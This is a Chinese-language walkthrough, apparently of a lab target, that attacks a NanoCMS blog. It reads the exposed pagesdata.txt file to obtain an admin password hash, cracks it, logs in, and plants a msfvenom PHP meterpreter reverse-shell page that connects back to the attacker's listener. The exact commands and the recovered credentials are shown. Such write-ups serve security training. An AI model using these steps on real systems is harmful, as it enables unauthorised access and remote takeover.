## 漏洞发现

在浏览网页的过程中发现网站的Blog模块使用的是NanoCMS

![](../Images/a9f580943d6be18165f21a3aa1374db3.png)

  

  

Nano CMS是一个基于PHP的内容管理系统 （CMS）。“ Nano CMS是您所能找到的最小的CMS。用户界面和功能非常非常简单和非常容易使用。Nano CMS的核心功能是基于文件并且可以执行根本不使用任何数据库，这使得安装起来超级容易。

经过搜索找到有关Nano CMS的漏洞https://cxsecurity.com/issue/WLB-2009040041

![](../Images/46774fc38fcf19ed307291486af1bef2.png)

  

## 漏洞利用

所以我们可以尝试在`http://192.168.1.21/~andy/` 后面加上 `/data/pagesdata.txt`

```
http://192.168.1.21/~andy/data/pagesdata.txt
```

![](../Images/ffeebbb03eb523672a57be9eb557cd90.png)

  

得到s:8:"username";s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd"

经过解密得到密码为：`shannon`

![](../Images/66d774ecdbdde9fc3dd8ef6edd6f4e3e.png)

  

  

而且在网站可以看到登录入口

![](../Images/8ce9f2cd19960ee0b138d83913465c7d.png)

  

  

尝试使用账号`admin`，密码`shannon`进行登录

![](../Images/d74962897c1c24423b77b9b813d230b8.png)

  

登录成功。

  

在浏览后台发现可以新建php语言页面

![](../Images/5b13cb39580e2da9e9bf64bf7ad6d664.png)

  

**使用msfvenom生成php木马，用MSF连接**

使用msfvenom生成PHP木马

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f raw
```

![](../Images/09dc75006e34a30cbd3540eac20913e8.png)

  

  

将得到的木马代码复制到网页中并命名为PHP1

![](../Images/6862a8c0c0f9d8d8fa0195f38fe76463.png)

  

  

创建成功

![](../Images/881a095396ae03c3182968fdf8256780.png)

  

  

打开msfconsole启动监听

```





root@kali-xmtx:~/桌面#msfconsole                                           --启动MSF
```

![](../Images/e3d7afacecfcc7b2420416afd6bedb0b.png)

  

  

在网站的Blog中找到PHP1文件，点击该文件。

![](../Images/672fa3e0b716991fb5082c32e33d643d.png)

  

  

返回到msfconsole中可以看见成功连接

![](../Images/0e0f9302199205b767fe4f2f4fbc5580.png)
